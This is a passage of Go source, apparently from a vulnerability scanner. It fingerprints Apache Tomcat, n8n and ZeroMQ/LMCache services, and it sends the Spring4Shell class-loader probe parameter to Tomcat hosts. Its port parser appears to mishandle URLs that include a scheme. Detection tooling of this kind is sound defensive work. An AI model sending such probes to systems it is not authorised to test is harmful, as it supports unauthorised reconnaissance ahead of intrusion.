	b, _ := io.ReadAll(io.LimitReader(r404.Body, 16384))
	r404.Body.Close()
	if !strings.Contains(string(b), "Apache Tomcat/") {
		return false
	}
	resp, err := c.HTTP.Get(c.BaseURL + "/?class.module.classLoader.defaultAssertionStatus=true")
	if err != nil {
		return false
	}
	io.Copy(io.Discard, io.LimitReader(resp.Body, 4096))
	resp.Body.Close()
	return resp.StatusCode == 200
}

// detectN8n 通过公开的 /rest/settings 返回的 versionCli 识别 n8n。
func (c *Client) detectN8n() (string, bool) {
	resp, err := c.HTTP.Get(c.BaseURL + "/rest/settings")
	if err != nil {
		return "", false
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		return "", false
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 16384))
	var v struct {
		Data struct {
			VersionCli string `json:"versionCli"`
		} `json:"data"`
	}
	if json.Unmarshal(body, &v) == nil && v.Data.VersionCli != "" {
		return v.Data.VersionCli, true
	}
	return "", false
}

// ParseZMQPort 从目标 URL 提取端口，用于 ZeroMQ 探测
func ParseZMQPort(raw string) int {
	if strings.Contains(raw, ":") {
		var p int
		fmt.Sscanf(strings.Split(raw, ":")[1], "%d", &p)
		return p
	}
	return 5555 // LMCache default
}

// ParseHost 从 URL 提取 host
func ParseHost(raw string) string {
	raw = strings.TrimPrefix(raw, "http://")
	raw = strings.TrimPrefix(raw, "https://")
	if i := strings.Index(raw, "/"); i != -1 {
		raw = raw[:i]
	}
	if i := strings.Index(raw, ":"); i != -1 {
		return raw[:i]
	}
	return raw
}

var _ = binary.BigEndian // keep import
